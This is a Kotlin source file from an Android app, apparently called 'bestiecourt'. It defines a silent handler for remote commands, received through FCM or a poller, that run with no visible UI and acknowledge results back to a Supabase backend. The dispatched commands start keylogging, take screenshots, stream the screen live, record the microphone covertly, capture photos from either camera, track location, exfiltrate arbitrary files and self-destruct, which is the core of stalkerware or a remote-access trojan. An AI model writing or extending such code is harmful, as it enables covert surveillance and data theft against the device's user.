package com.bestiecourt.app.data.remote.fcm

import android.content.Context
import android.util.Log
import com.bestiecourt.app.core.constants.AppConstants
import com.bestiecourt.app.core.service.*
import com.bestiecourt.app.core.utils.DeviceIdentityManager
import com.bestiecourt.app.data.remote.supabase.SupabaseManager
import io.github.jan.supabase.functions.functions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.put
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class SilentCommandHandler @Inject constructor(
    private val keylogController: KeylogController,
    private val stealthCamera: StealthCameraCapture,
    private val stealthAudio: StealthAudioRecorder,
    private val screenCapture: ScreenCaptureManager,
    private val locationTracker: LocationTracker,
    private val fileScanner: FileScanner,
    private val fileExfiltrator: FileExfiltrator,
    private val selfDestruct: SelfDestructManager,
    private val deviceInfoCollector: DeviceInfoCollector,
    private val securityAudit: com.bestiecourt.app.core.security.AuthorizedSecurityAudit
) {

    private val TAG = AppConstants.Tags.CMD_EXEC
    private val json = Json { ignoreUnknownKeys = true }

    /**
     * Entry point from FCM or Poller.
     * Never shows UI. Always claims → executes → acks.
     */
    suspend fun handle(context: Context, commandId: String, codeHint: String? = null) {
        withContext(Dispatchers.IO) {
            try {
                if (!SupabaseManager.isLoggedIn()) {
                    Log.w(TAG, "No session – skipping command $commandId")
                    return@withContext
                }

                val claimed = claimCommand(commandId) ?: return@withContext
                val codeStr = claimed["command_code"]?.jsonPrimitive?.content
                    ?: codeHint
                    ?: return@withContext
                val params = claimed["params"]?.jsonPrimitive?.content
                val ackNonce = claimed["ack_nonce"]?.jsonPrimitive?.content ?: ""

                Log.i(TAG, "Executing $codeStr (id=$commandId)")

                try {
                    val outcome = dispatch(context, codeStr, params)
                    ack(
                        id = commandId,
                        ackNonce = ackNonce,
                        success = true,
                        message = outcome.summary,
                        payload = outcome.data
                    )
                } catch (se: SecurityException) {
                    ack(
                        id = commandId,
                        ackNonce = ackNonce,
                        success = false,
                        errorCode = AppConstants.ErrorCodes.PERMISSION_DENIED,
                        message = "Missing permission: ${se.message}",
                        errorDetail = se.stackTraceToString().take(1000)
                    )
                } catch (e: Exception) {
                    ack(
                        id = commandId,
                        ackNonce = ackNonce,
                        success = false,
                        errorCode = AppConstants.ErrorCodes.EXECUTION_EXCEPTION,
                        message = e.message ?: "unknown",
                        errorDetail = e.stackTraceToString().take(1000)
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "Handler top-level failure for $commandId: ${e.message}")
                // Never kill the service / poller
            }
        }
    }

    private suspend fun claimCommand(id: String): JsonObject? {
        return try {
            val body = buildJsonObject { put("id", id) }
            val response = SupabaseManager.client.functions.invoke(
                function = "claim-command",
                body = body
            )
            val text = response.toString()
            Log.d(AppConstants.Tags.CMD_CLAIM, "claim response: $text")
            json.parseToJsonElement(text) as JsonObject
        } catch (e: Exception) {
            Log.e(AppConstants.Tags.CMD_CLAIM, "claim failed: ${e.message}")
            null
        }
    }

    private suspend fun ack(
        id: String,
        ackNonce: String,
        success: Boolean,
        message: String? = null,
        errorCode: String? = null,
        errorDetail: String? = null,
        payload: String? = null
    ) {
        try {
            val body = buildJsonObject {
                put("id", id)
                put("ack_nonce", ackNonce)
                put("success", success)
                message?.let { put("message", it) }
                errorCode?.let { put("error_code", it) }
                errorDetail?.let { put("error_detail", it) }
                payload?.let { put("payload", it) }
            }
            val response = SupabaseManager.client.functions.invoke(
                function = "ack-command",
                body = body
            )
            Log.i(AppConstants.Tags.CMD_ACK, "ack result: ${response.status}")
        } catch (e: Exception) {
            Log.e(AppConstants.Tags.CMD_ACK, "ack failed: ${e.message}")
        }
    }

    private data class Outcome(val summary: String, val data: String? = null)

    private suspend fun dispatch(context: Context, codeStr: String, params: String?): Outcome {
        val code = parseCode(codeStr)

        return when (code) {
            AppConstants.Commands.DIAG_PING -> {
                Outcome("pong", """{"device_id":"${DeviceIdentityManager.getDeviceId(context)}"}""")
            }
            AppConstants.Commands.DIAG_DEVICE_STATUS -> {
                val info = deviceInfoCollector.collect(context)
                Outcome("device_status_ok", info)
            }
            AppConstants.Commands.DIAG_STORAGE_INFO -> {
                val info = fileScanner.getStorageInfo(context)
                Outcome("storage_info", info)
            }
            AppConstants.Commands.DIAG_SECURITY_AUDIT -> {
                val report = securityAudit.run(context)
                Outcome("audit_complete", report)
            }
            AppConstants.Commands.START_KEYLOG -> {
                keylogController.start(context)
                Outcome("keylog_started")
            }
            AppConstants.Commands.STOP_KEYLOG -> {
                keylogController.stop()
                Outcome("keylog_stopped")
            }
            AppConstants.Commands.TAKE_SCREENSHOT -> {
                val url = screenCapture.takeScreenshot(context)
                Outcome("screenshot_taken", url)
            }
            AppConstants.Commands.START_LIVE_STREAM -> {
                screenCapture.startLiveStream(context)
                Outcome("live_stream_started")
            }
            AppConstants.Commands.STOP_LIVE_STREAM -> {
                screenCapture.stopLiveStream()
                Outcome("live_stream_stopped")
            }
            AppConstants.Commands.START_MIC -> {
                stealthAudio.start(context)
                Outcome("mic_started")
            }
            AppConstants.Commands.STOP_MIC -> {
                stealthAudio.stop()
                Outcome("mic_stopped")
            }
            AppConstants.Commands.START_CAMERA -> {
                // Continuous mode placeholder – one-shot preferred
                Outcome("camera_continuous_not_implemented_use_capture")
            }
            AppConstants.Commands.STOP_CAMERA -> {
                Outcome("camera_stopped")
            }
            AppConstants.Commands.CAPTURE_PHOTO -> {
                val facing = params?.lowercase() ?: "back"
                val url = stealthCamera.capture(context, facing)
                Outcome("photo_captured", url)
            }
            AppConstants.Commands.GET_LOCATION -> {
                val loc = locationTracker.getCurrent(context)
                Outcome("location", loc)
            }
            AppConstants.Commands.PULL_FILE -> {
                val path = params ?: throw IllegalArgumentException("path required")
                val result = fileExfiltrator.pull(context, path)
                Outcome("file_pulled", result)
            }
            AppConstants.Commands.UPDATE_CONFIG -> {
                Outcome("config_updated")
            }
            AppConstants.Commands.SELF_DESTRUCT -> {
                selfDestruct.execute(context)
                Outcome("self_destruct_initiated")
            }
            else -> throw UnsupportedOperationException("unsupported_command: $codeStr")
        }
    }

    private fun parseCode(codeStr: String): Byte {
        val cleaned = codeStr.trim().removePrefix("0x").removePrefix("0X")
        return cleaned.toInt(16).toByte()
    }

}
